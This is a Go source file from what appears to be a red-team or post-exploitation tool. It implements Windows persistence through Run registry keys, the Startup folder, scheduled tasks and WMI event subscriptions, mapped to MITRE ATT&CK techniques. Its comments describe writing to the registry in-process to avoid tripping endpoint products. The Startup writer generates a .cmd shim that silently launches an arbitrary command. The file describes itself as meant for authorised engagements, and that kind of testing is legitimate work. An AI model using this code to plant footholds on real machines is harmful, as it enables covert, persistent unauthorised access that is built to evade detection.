// Package persist implements the persistence primitives of T1547 (Registry Run
// Keys / Startup Folder), T1053.005 (Scheduled Tasks) and T1546.003 (WMI Event
// Subscription), plus listing and removal, for authorised engagements.
//
// The registry and Startup surfaces are written in-process through the
// registry API — no child process, no command line for endpoint products to
// trip on. Scheduled tasks and WMI subscriptions use the OS management
// utilities (schtasks.exe, powershell.exe) because the native COM/Task
// interfaces would balloon the dependency surface; that trade-off is explicit
// and noted at each call site. Server-side every route answers 403 unless the
// operator started with --enable-persist.
package persist

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

// Hive names the registry root for Run key operations.
type Hive string

const (
	HKCU Hive = "HKCU"
	HKLM Hive = "HKLM"
)

// Entry type discriminators, also used by the dashboard to badge each row.
const (
	TypeRun     = "run"
	TypeStartup = "startup"
	TypeTask    = "task"
	TypeWMI     = "wmi"
)

// Entry is one persistence foothold.
type Entry struct {
	Type    string `json:"type"` // run | startup | task | wmi
	Hive    string `json:"hive"` // HKCU/HKLM (run), "Startup", "TaskScheduler", "WMI"
	Name    string `json:"name"` // value/file/task/consumer name
	Command string `json:"cmd"`  // what runs (or the task action / consumer template)
}

// Spec describes one foothold to create or remove. Type defaults to "run".
type Spec struct {
	Type      string `json:"type"`
	Hive      string `json:"hive"`
	Name      string `json:"name"`
	Command   string `json:"cmd"`
	Schedule  string `json:"schedule"`   // task: ONLOGON (default) | ONSTART | ONCE
	StartTime string `json:"start_time"` // task ONCE: HH:MM (24h)
}

func (s Spec) normalizedType() string {
	if strings.TrimSpace(s.Type) == "" {
		return TypeRun
	}
	return strings.ToLower(strings.TrimSpace(s.Type))
}

// List returns every foothold this host exposes across the four surfaces.
func List() ([]Entry, error) {
	out := make([]Entry, 0, 8)
	out = append(out, listRun()...)
	out = append(out, listStartup()...)
	out = append(out, listTasks()...)
	out = append(out, listWMI()...)
	return out, nil
}

// Add creates one foothold. The name and command are validated once here so
// every backend shares the same rules.
func Add(s Spec) error {
	name := sanitizeName(s.Name)
	if name == "" {
		return fmt.Errorf("persist: name is required (letters, digits, . _ -)")
	}
	if strings.TrimSpace(s.Command) == "" {
		return fmt.Errorf("persist: command is required")
	}
	switch s.normalizedType() {
	case TypeRun:
		return addRun(Hive(strings.ToUpper(strings.TrimSpace(s.Hive))), name, s.Command)
	case TypeStartup:
		return addStartup(name, s.Command)
	case TypeTask:
		return addTask(name, s.Command, s.Schedule, s.StartTime)
	case TypeWMI:
		return addWMI(name, s.Command)
	default:
		return fmt.Errorf("persist: unknown type %q (run/startup/task/wmi)", s.Type)
	}
}

// Remove deletes one foothold; a missing entry is not an error.
func Remove(s Spec) error {
	name := sanitizeName(s.Name)
	if name == "" {
		return fmt.Errorf("persist: name is required")
	}
	switch s.normalizedType() {
	case TypeRun:
		return removeRun(Hive(strings.ToUpper(strings.TrimSpace(s.Hive))), name)
	case TypeStartup:
		return removeStartup(name)
	case TypeTask:
		return removeTask(name)
	case TypeWMI:
		return removeWMI(name)
	default:
		return fmt.Errorf("persist: unknown type %q (run/startup/task/wmi)", s.Type)
	}
}

// startupDir returns the per-user Startup folder path.
func startupDir() (string, error) {
	appdata := os.Getenv("APPDATA")
	if appdata == "" {
		return "", fmt.Errorf("persist: %%APPDATA%% not set")
	}
	return filepath.Join(appdata, `Microsoft\Windows\Start Menu\Programs\Startup`), nil
}

// shimContent builds the Startup folder payload. A .lnk is an OLE document;
// hand-rolling the full ShellLink format is brittle, so the Startup writer
// emits a .cmd shim with the same semantics (the Startup folder executes any
// .cmd/.bat/.lnk/.exe placed in it) and names the entry after the requested
// name for a 1:1 list mapping.
func shimContent(cmd string) string {
	return "@echo off\r\nrem OBLITERATUS persistence entry (remove via the Pulse dashboard)\r\nstart \"\" /min " + cmd + "\r\n"
}

// sanitizeName keeps value names to a safe, filesystem- and service-name
// compatible set so one API cannot be abused to write arbitrary value paths,
// traversal filenames or PowerShell metacharacters.
func sanitizeName(name string) string {
	name = strings.TrimSpace(name)
	if len(name) > 64 {
		name = name[:64]
	}
	var b strings.Builder
	for _, r := range name {
		switch {
		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r >= '0' && r <= '9', r == '-' || r == '_' || r == '.':
			b.WriteRune(r)
		}
	}
	return b.String()
}
